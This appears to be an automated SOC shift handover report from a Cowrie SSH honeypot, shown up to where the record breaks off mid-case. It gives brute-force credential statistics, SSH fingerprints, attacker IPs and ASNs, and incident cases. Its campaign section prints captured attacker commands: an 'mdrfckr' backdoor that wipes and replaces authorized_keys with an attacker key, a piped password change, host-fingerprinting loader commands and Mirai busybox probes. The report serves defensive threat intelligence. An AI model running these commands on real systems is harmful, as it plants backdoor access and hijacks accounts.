# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-08 |
| **Generated At** | 2026-07-08T21:12:36Z |
| **Shift Time** | 21:12 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **272** |
| Confirmed Threats | **261** |
| False Positives Filtered | **11** (4.0%) |
| Unique Attacker IPs | **85** |
| Countries of Origin | **24** |
| High Severity Cases | **174** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **98** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **208** |
| Unique Credential Pairs | **149** |
| Unique Usernames | **35** |
| Unique Passwords | **83** |
| Successful Auth Pairs | **195** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 61 |
| `admin` | 20 |
| `debian` | 10 |
| `support` | 9 |
| `ec2-user` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `12345678` | 12 |
| `123456` | 11 |
| `123123` | 8 |
| `111111` | 8 |
| `qwerty` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `admin` | `12345678` | 6 |
| `blank` | `blank13` | 6 |
| `operator` | `112233` | 5 |
| `default` | `default13` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `bacula` | `bacula` | `10.0.0.73` | 2026-07-08T18:55:12 |
| `root` | `qazwsxlinux` | `185.242.3.195` | 2026-07-08T18:55:20 |
| `root` | `root000` | `114.30.180.58` | 2026-07-08T18:55:43 |
| `deploy` | `qwerty` | `91.92.40.176` | 2026-07-08T18:57:23 |
| `root` | `qazwsxlinux` | `10.0.0.73` | 2026-07-08T18:59:05 |
| `root` | `!root` | `92.118.39.49` | 2026-07-08T18:59:06 |
| `root` | `root000` | `10.0.0.73` | 2026-07-08T18:59:37 |
| `deploy` | `123123` | `91.92.40.176` | 2026-07-08T18:59:49 |
| `web3` | `123456` | `45.198.224.120` | 2026-07-08T19:00:17 |
| `root` | `111111` | `92.118.39.49` | 2026-07-08T19:01:09 |
| `default` | `default13` | `125.35.109.214` | 2026-07-08T19:01:15 |
| `default` | `default13` | `138.121.202.90` | 2026-07-08T19:01:28 |
| `user` | `user6` | `106.89.59.26` | 2026-07-08T19:01:34 |
| `default` | `default13` | `10.0.0.73` | 2026-07-08T19:01:40 |
| `support` | `support2` | `120.62.8.163` | 2026-07-08T19:01:58 |
| `deploy` | `111111` | `91.92.40.176` | 2026-07-08T19:02:09 |
| `support` | `support2` | `10.0.0.73` | 2026-07-08T19:02:11 |
| `root` | `david123` | `47.239.170.243` | 2026-07-08T19:03:07 |
| `345gs5662d34` | `345gs5662d34` | `47.239.170.243` | 2026-07-08T19:03:11 |
| `root` | `3245gs5662d34` | `47.239.170.243` | 2026-07-08T19:03:12 |
| `root` | `123123` | `92.118.39.49` | 2026-07-08T19:03:15 |
| `deploy` | `1234567` | `91.92.40.176` | 2026-07-08T19:04:30 |
| `root` | `1234` | `92.118.39.49` | 2026-07-08T19:05:20 |
| `user` | `user6` | `10.0.0.73` | 2026-07-08T19:05:44 |
| `ec2-user` | `123456` | `91.92.40.176` | 2026-07-08T19:06:52 |
| `root` | `12345` | `92.118.39.49` | 2026-07-08T19:07:29 |
| `ec2-user` | `password` | `91.92.40.176` | 2026-07-08T19:09:16 |
| `ec2-user` | `123456789` | `91.92.40.176` | 2026-07-08T19:11:37 |
| `root` | `12345678` | `92.118.39.49` | 2026-07-08T19:11:40 |
| `root` | `asdf1234!@#$` | `45.198.224.114` | 2026-07-08T19:12:45 |
| `root` | `123456789` | `92.118.39.49` | 2026-07-08T19:13:47 |
| `ec2-user` | `12345` | `91.92.40.176` | 2026-07-08T19:13:56 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-08T19:14:39 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-08T19:14:39 |
| `root` | `P@ssw0rd` | `92.118.39.49` | 2026-07-08T19:15:53 |
| `ec2-user` | `12345678` | `91.92.40.176` | 2026-07-08T19:16:15 |
| `presbish` | `presbish` | `10.0.0.73` | 2026-07-08T19:16:29 |
| `paper` | `paper` | `106.12.108.64` | 2026-07-08T19:16:41 |
| `ubuntu` | `1qaz2wsx` | `45.198.224.120` | 2026-07-08T19:17:48 |
| `root` | `Password1` | `92.118.39.49` | 2026-07-08T19:17:59 |
| `ubuntu` | `abc` | `120.48.122.158` | 2026-07-08T19:18:22 |
| `345gs5662d34` | `345gs5662d34` | `120.48.122.158` | 2026-07-08T19:18:25 |
| `ubuntu` | `3245gs5662d34` | `120.48.122.158` | 2026-07-08T19:18:27 |
| `ec2-user` | `qwerty` | `91.92.40.176` | 2026-07-08T19:18:36 |
| `root` | `Root123` | `92.118.39.49` | 2026-07-08T19:20:09 |
| `ec2-user` | `123123` | `91.92.40.176` | 2026-07-08T19:21:00 |
| `admin` | `12345678` | `45.182.5.98` | 2026-07-08T19:21:21 |
| `root` | `A1qwerty` | `193.68.57.43` | 2026-07-08T19:21:25 |
| `345gs5662d34` | `345gs5662d34` | `193.68.57.43` | 2026-07-08T19:21:28 |
| `root` | `3245gs5662d34` | `193.68.57.43` | 2026-07-08T19:21:29 |
| `admin` | `12345678` | `223.75.156.89` | 2026-07-08T19:21:30 |
| `root` | `admin` | `92.118.39.49` | 2026-07-08T19:22:19 |
| `root` | `---fuck_you----` | `58.223.165.154` | 2026-07-08T19:23:18 |
| `presbish` | `presbish` | `45.198.224.114` | 2026-07-08T19:23:19 |
| `ec2-user` | `111111` | `91.92.40.176` | 2026-07-08T19:23:21 |
| `root` | `admin123` | `92.118.39.49` | 2026-07-08T19:24:22 |
| `admin` | `12345678` | `85.19.195.12` | 2026-07-08T19:24:45 |
| `admin` | `12345678` | `183.196.144.45` | 2026-07-08T19:24:54 |
| `admin` | `12345678` | `10.0.0.73` | 2026-07-08T19:25:11 |
| `ec2-user` | `1234567` | `91.92.40.176` | 2026-07-08T19:25:40 |
| `root` | `alpine` | `92.118.39.49` | 2026-07-08T19:26:26 |
| `steam` | `Passw0rd` | `54.38.78.118` | 2026-07-08T19:26:47 |
| `345gs5662d34` | `345gs5662d34` | `54.38.78.118` | 2026-07-08T19:26:50 |
| `steam` | `3245gs5662d34` | `54.38.78.118` | 2026-07-08T19:26:50 |
| `admin` | `default` | `72.195.114.182` | 2026-07-08T19:26:59 |
| `admin` | `default` | `10.0.0.73` | 2026-07-08T19:27:10 |
| `ubuntu` | `ubuntu` | `77.223.122.29` | 2026-07-08T19:27:24 |
| `support` | `support123456789` | `65.20.146.109` | 2026-07-08T19:27:29 |
| `support` | `support123456789` | `192.34.128.202` | 2026-07-08T19:27:37 |
| `ubuntu` | `ubuntu` | `60.223.245.120` | 2026-07-08T19:27:38 |
| `centos` | `123456` | `91.92.40.176` | 2026-07-08T19:27:59 |
| `root` | `changeme` | `92.118.39.49` | 2026-07-08T19:28:34 |
| `centos` | `password` | `91.92.40.176` | 2026-07-08T19:30:22 |
| `root` | `default` | `92.118.39.49` | 2026-07-08T19:30:39 |
| `centos` | `123456789` | `91.92.40.176` | 2026-07-08T19:32:42 |
| `root` | `letmein` | `92.118.39.49` | 2026-07-08T19:32:54 |
| `utente` | `utente` | `45.198.224.114` | 2026-07-08T19:34:02 |
| `andrea` | `andrea` | `45.198.224.120` | 2026-07-08T19:34:52 |
| `centos` | `12345` | `91.92.40.176` | 2026-07-08T19:35:02 |
| `root` | `passw0rd` | `92.118.39.49` | 2026-07-08T19:35:16 |
| `centos` | `12345678` | `91.92.40.176` | 2026-07-08T19:37:26 |
| `root` | `password` | `92.118.39.49` | 2026-07-08T19:37:36 |
| `root` | `qwerty` | `92.118.39.49` | 2026-07-08T19:39:38 |
| `centos` | `qwerty` | `91.92.40.176` | 2026-07-08T19:39:45 |
| `admin` | `admin` | `82.165.175.206` | 2026-07-08T19:40:54 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-08T19:40:55 |
| `root` | `r00t` | `92.118.39.49` | 2026-07-08T19:41:43 |
| `centos` | `123123` | `91.92.40.176` | 2026-07-08T19:42:02 |
| `ftp1` | `ftp1` | `45.198.224.120` | 2026-07-08T19:43:08 |
| `centos` | `111111` | `91.92.40.176` | 2026-07-08T19:44:22 |
| `root` | `root123` | `92.118.39.49` | 2026-07-08T19:45:59 |
| `centos` | `1234567` | `91.92.40.176` | 2026-07-08T19:46:41 |
| `root` | `root@123` | `92.118.39.49` | 2026-07-08T19:48:02 |
| `webtest1` | `webtest1` | `10.0.0.73` | 2026-07-08T19:48:25 |
| `ubnt` | `ubnt33` | `118.183.180.108` | 2026-07-08T19:48:42 |
| `ubnt` | `ubnt33` | `180.151.254.218` | 2026-07-08T19:48:54 |
| `guest` | `techsupport` | `222.117.173.94` | 2026-07-08T19:48:56 |
| `debian` | `123456` | `91.92.40.176` | 2026-07-08T19:49:01 |
| `guest` | `techsupport` | `117.248.201.39` | 2026-07-08T19:49:05 |
| `root` | `rootme` | `92.118.39.49` | 2026-07-08T19:50:02 |
| `default` | `default2` | `178.178.222.58` | 2026-07-08T19:50:10 |
| `default` | `default2` | `179.184.85.167` | 2026-07-08T19:50:19 |
| `default` | `default2` | `10.0.0.73` | 2026-07-08T19:50:40 |
| `root` | `Qwerty123` | `185.242.3.195` | 2026-07-08T19:50:49 |
| `debian` | `password` | `91.92.40.176` | 2026-07-08T19:51:22 |
| `root` | `qwe1234!@#$` | `45.198.224.120` | 2026-07-08T19:51:58 |
| `root` | `system` | `92.118.39.49` | 2026-07-08T19:52:01 |
| `guest` | `techsupport` | `196.188.93.169` | 2026-07-08T19:52:05 |
| `guest` | `techsupport` | `37.238.45.202` | 2026-07-08T19:52:19 |
| `blank` | `blank13` | `220.246.43.172` | 2026-07-08T19:52:56 |
| `blank` | `blank13` | `121.202.198.98` | 2026-07-08T19:53:15 |
| `debian` | `123456789` | `91.92.40.176` | 2026-07-08T19:53:39 |
| `root` | `toor` | `92.118.39.49` | 2026-07-08T19:54:05 |
| `debian` | `12345` | `91.92.40.176` | 2026-07-08T19:56:00 |
| `root` | `welcome` | `92.118.39.49` | 2026-07-08T19:56:08 |
| `blank` | `blank13` | `65.20.146.109` | 2026-07-08T19:56:21 |
| `blank` | `blank13` | `177.159.150.111` | 2026-07-08T19:56:30 |
| `blank` | `blank13` | `10.0.0.73` | 2026-07-08T19:56:46 |
| `support` | `support` | `176.53.159.196` | 2026-07-08T19:57:03 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-08T19:57:23 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-08T19:57:23 |
| `debian` | `12345678` | `91.92.40.176` | 2026-07-08T19:58:12 |
| `admin` | `111111` | `92.118.39.49` | 2026-07-08T19:58:19 |
| `support` | `support` | `10.0.0.73` | 2026-07-08T19:58:22 |
| `debian` | `qwerty` | `91.92.40.176` | 2026-07-08T20:00:23 |
| `admin` | `123123` | `92.118.39.49` | 2026-07-08T20:00:33 |
| `jordan` | `jordan23` | `45.198.224.120` | 2026-07-08T20:01:06 |
| `debian` | `123123` | `91.92.40.176` | 2026-07-08T20:02:32 |
| `admin` | `1234` | `92.118.39.49` | 2026-07-08T20:02:45 |
| `debian` | `111111` | `91.92.40.176` | 2026-07-08T20:04:47 |
| `admin` | `12345` | `92.118.39.49` | 2026-07-08T20:04:54 |
| `admin` | `123456` | `92.118.39.49` | 2026-07-08T20:07:00 |
| `debian` | `1234567` | `91.92.40.176` | 2026-07-08T20:07:01 |
| `admin` | `12345678` | `92.118.39.49` | 2026-07-08T20:09:05 |
| `fedora` | `123456` | `91.92.40.176` | 2026-07-08T20:09:16 |
| `draco` | `draco` | `10.0.0.73` | 2026-07-08T20:09:54 |
| `root` | `1qw23er4` | `45.198.224.120` | 2026-07-08T20:10:16 |
| `admin` | `123456789` | `92.118.39.49` | 2026-07-08T20:11:09 |
| `root` | `Ww112233` | `10.0.0.73` | 2026-07-08T20:11:23 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-08T20:11:26 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-08T20:11:27 |
| `fedora` | `password` | `91.92.40.176` | 2026-07-08T20:11:31 |
| `guest` | `root` | `65.20.146.109` | 2026-07-08T20:12:08 |
| `admin` | `Admin123` | `92.118.39.49` | 2026-07-08T20:13:17 |
| `fedora` | `123456789` | `91.92.40.176` | 2026-07-08T20:13:42 |
| `guest` | `guest66` | `211.253.10.61` | 2026-07-08T20:14:03 |
| `guest` | `guest66` | `124.152.90.68` | 2026-07-08T20:14:18 |
| `admin` | `Administrator` | `92.118.39.49` | 2026-07-08T20:15:23 |
| `guest` | `root` | `51.75.142.157` | 2026-07-08T20:15:38 |
| `guest` | `root` | `65.20.204.88` | 2026-07-08T20:15:45 |
| `fedora` | `12345` | `91.92.40.176` | 2026-07-08T20:15:56 |
| `draco` | `draco` | `45.198.224.114` | 2026-07-08T20:16:44 |
| `admin` | `P@ssw0rd` | `92.118.39.49` | 2026-07-08T20:17:33 |
| `service` | `admin` | `203.198.173.137` | 2026-07-08T20:17:52 |
| `fedora` | `12345678` | `91.92.40.176` | 2026-07-08T20:18:06 |
| `admin` | `access` | `92.118.39.49` | 2026-07-08T20:19:39 |
| `fedora` | `qwerty` | `91.92.40.176` | 2026-07-08T20:20:22 |
| `root` | `root123456` | `10.0.0.73` | 2026-07-08T20:20:36 |
| `root` | `234` | `10.0.0.73` | 2026-07-08T20:22:03 |
| `fedora` | `123123` | `91.92.40.176` | 2026-07-08T20:22:41 |
| `root` | `Kevin123` | `182.52.90.106` | 2026-07-08T20:23:25 |
| `345gs5662d34` | `345gs5662d34` | `182.52.90.106` | 2026-07-08T20:23:29 |
| `root` | `3245gs5662d34` | `182.52.90.106` | 2026-07-08T20:23:31 |
| `fedora` | `111111` | `91.92.40.176` | 2026-07-08T20:24:59 |
| `fedora` | `1234567` | `91.92.40.176` | 2026-07-08T20:27:14 |
| `root` | `qq1314520` | `45.198.224.120` | 2026-07-08T20:27:31 |
| `root` | `root123456` | `45.198.224.114` | 2026-07-08T20:27:32 |
| `redhat` | `123456` | `91.92.40.176` | 2026-07-08T20:29:35 |
| `root` | `Qwerty123` | `10.0.0.73` | 2026-07-08T20:31:36 |
| `redhat` | `password` | `91.92.40.176` | 2026-07-08T20:31:59 |
| `root` | `neworang` | `91.92.40.90` | 2026-07-08T20:32:59 |
| `redhat` | `123456789` | `91.92.40.176` | 2026-07-08T20:34:25 |
| `debian` | `121212` | `45.198.224.120` | 2026-07-08T20:35:51 |
| `redhat` | `12345` | `91.92.40.176` | 2026-07-08T20:36:49 |
| `dasusr1` | `dasusr1` | `45.198.224.114` | 2026-07-08T20:38:40 |
| `test` | `123456` | `191.36.152.28` | 2026-07-08T20:38:49 |
| `test` | `123456` | `178.178.222.52` | 2026-07-08T20:39:01 |
| `redhat` | `12345678` | `91.92.40.176` | 2026-07-08T20:39:19 |
| `root` | `123qwe!@#` | `111.42.132.19` | 2026-07-08T20:41:14 |
| `redhat` | `qwerty` | `91.92.40.176` | 2026-07-08T20:41:47 |
| `vboxadd` | `vboxadd` | `10.0.0.73` | 2026-07-08T20:42:26 |
| `operator` | `112233` | `36.39.140.2` | 2026-07-08T20:43:37 |
| `dixell` | `dixell` | `200.232.114.71` | 2026-07-08T20:43:41 |
| `operator` | `112233` | `181.177.169.88` | 2026-07-08T20:43:46 |
| `redhat` | `123123` | `91.92.40.176` | 2026-07-08T20:44:14 |
| `root` | `Qidi@2352@#%@` | `45.198.224.120` | 2026-07-08T20:44:30 |
| `redhat` | `111111` | `91.92.40.176` | 2026-07-08T20:46:38 |
| `operator` | `112233` | `41.65.118.172` | 2026-07-08T20:47:07 |
| `operator` | `112233` | `61.145.181.7` | 2026-07-08T20:47:20 |
| `operator` | `112233` | `10.0.0.73` | 2026-07-08T20:47:34 |
| `redhat` | `1234567` | `91.92.40.176` | 2026-07-08T20:49:00 |
| `vboxadd` | `vboxadd` | `45.198.224.114` | 2026-07-08T20:49:20 |
| `admin1` | `123456` | `91.92.40.176` | 2026-07-08T20:51:20 |
| `gdm` | `gdm` | `10.0.0.73` | 2026-07-08T20:53:05 |
| `admin1` | `password` | `91.92.40.176` | 2026-07-08T20:53:43 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **272** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 117 |
| OpenSSH | 41 |
| libssh | 27 |
| Paramiko (Python) | 4 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 90 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 41 | 39 |
| `16443846184e...` | Generic scanner | 21 | 3 |
| `f555226df196...` | Mirai/variant | 18 | 6 |
| `a2de0f306611...` | Mirai/variant | 4 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 90 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 41 | 39 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 21 | 3 | Generic scanner |
| `f555226df196...` | libssh | 18 | 6 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 3 | — |
| `a2de0f306611...` | Paramiko (Python) | 4 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 88 | 2 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "paper\nHpSKMJzdCtZM\nHpSKMJzdCtZM"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `106.12.108.64`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.49`, `91.92.40.176`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `91.92.40.90`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **85** |
| Unique ASNs | **59** |
| High-Risk ASNs | **55** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS25159` | PJSC MegaFon | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS16276` | OVH SAS | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (174)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-79e0d817422c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-08 18:55 |
| **Last Seen** | 2026-07-08 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:55:20` | `cowrie.session.connect` |
| `2026-07-08 18:55:20` | `cowrie.client.version` |
| `2026-07-08 18:55:20` | `cowrie.client.kex` |
| `2026-07-08 18:55:20` | `cowrie.login.success` |
| `2026-07-08 18:55:21` | `cowrie.session.params` |
| `2026-07-08 18:55:21` | `cowrie.command.input` |
| `2026-07-08 18:55:21` | `cowrie.log.closed` |
| `2026-07-08 18:55:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f01c3f634fb0

| Field | Detail |
|---|---|
| **Source IP** | `114.30.180[.]58` |
| **First Seen** | 2026-07-08 18:55 |
| **Last Seen** | 2026-07-08 18:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:55:40` | `cowrie.session.connect` |
| `2026-07-08 18:55:41` | `cowrie.client.version` |
| `2026-07-08 18:55:41` | `cowrie.client.kex` |
| `2026-07-08 18:55:43` | `cowrie.login.success` |
| `2026-07-08 18:55:44` | `cowrie.direct-tcpip.request` |
| `2026-07-08 18:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.30.180[.]58` to AbuseIPDB if not already reported
- [ ] Block `114.30.180[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-813e39e75e0f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:57 |
| **Last Seen** | 2026-07-08 18:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:57:21` | `cowrie.session.connect` |
| `2026-07-08 18:57:21` | `cowrie.client.version` |
| `2026-07-08 18:57:21` | `cowrie.client.kex` |
| `2026-07-08 18:57:23` | `cowrie.login.success` |
| `2026-07-08 18:57:24` | `cowrie.session.params` |
| `2026-07-08 18:57:24` | `cowrie.command.input` |
| `2026-07-08 18:57:24` | `cowrie.command.input` |
| `2026-07-08 18:57:24` | `cowrie.command.input` |
| `2026-07-08 18:57:24` | `cowrie.command.input` |
| `2026-07-08 18:57:24` | `cowrie.command.input` |
| `2026-07-08 18:57:24` | `cowrie.command.success` |
| `2026-07-08 18:57:24` | `cowrie.command.input` |
| `2026-07-08 18:57:24` | `cowrie.command.input` |
| `2026-07-08 18:57:24` | `cowrie.command.input` |
| `2026-07-08 18:57:24` | `cowrie.command.input` |
| `2026-07-08 18:57:24` | `cowrie.log.closed` |
| `2026-07-08 18:57:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-877d032dae69

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 18:59 |
| **Last Seen** | 2026-07-08 18:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:59:03` | `cowrie.session.connect` |
| `2026-07-08 18:59:03` | `cowrie.client.version` |
| `2026-07-08 18:59:03` | `cowrie.client.kex` |
| `2026-07-08 18:59:06` | `cowrie.login.success` |
| `2026-07-08 18:59:08` | `cowrie.session.params` |
| `2026-07-08 18:59:08` | `cowrie.command.input` |
| `2026-07-08 18:59:08` | `cowrie.command.input` |
| `2026-07-08 18:59:08` | `cowrie.command.input` |
| `2026-07-08 18:59:08` | `cowrie.command.input` |
| `2026-07-08 18:59:08` | `cowrie.command.input` |
| `2026-07-08 18:59:08` | `cowrie.command.success` |
| `2026-07-08 18:59:08` | `cowrie.command.input` |
| `2026-07-08 18:59:08` | `cowrie.command.input` |
| `2026-07-08 18:59:08` | `cowrie.command.input` |
| `2026-07-08 18:59:08` | `cowrie.command.input` |
| `2026-07-08 18:59:08` | `cowrie.log.closed` |
| `2026-07-08 18:59:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e61b801488b6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:59 |
| **Last Seen** | 2026-07-08 18:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
